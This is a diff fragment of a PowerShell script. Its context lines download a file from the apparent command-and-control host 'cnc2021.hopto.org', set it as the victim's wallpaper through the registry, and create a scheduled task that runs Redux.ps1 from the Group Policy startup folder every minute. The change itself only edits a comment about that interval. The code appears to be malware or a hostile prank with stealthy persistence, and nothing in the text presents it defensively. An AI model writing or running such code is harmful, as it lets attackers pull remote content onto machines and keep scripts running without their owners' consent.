@@ -90,7 +90,7 @@ $Shortcut.WindowStyle = 7
 $Shortcut.Save()
 #Sets Windows Background
 wget "http://cnc2021.hopto.org/268433.bak" -outfile "$env:USERPROFILE\AppData\Local\Temp\268433.jpg"; Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name wallpaper -value $env:USERPROFILE\AppData\Local\Temp\268433.jpg | rundll32.exe user32.dll, UpdatePerUserSystemParameters
-#Adds Scheduled Task to run Redux.ps1 every 30mins
+#Adds Scheduled Task to run Redux.ps1 every 1mins
 $jobname = "Recurring PowerShell Task"
 $script =  "C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup\Redux.ps1"
 $repeat = (New-TimeSpan -Minutes 1)
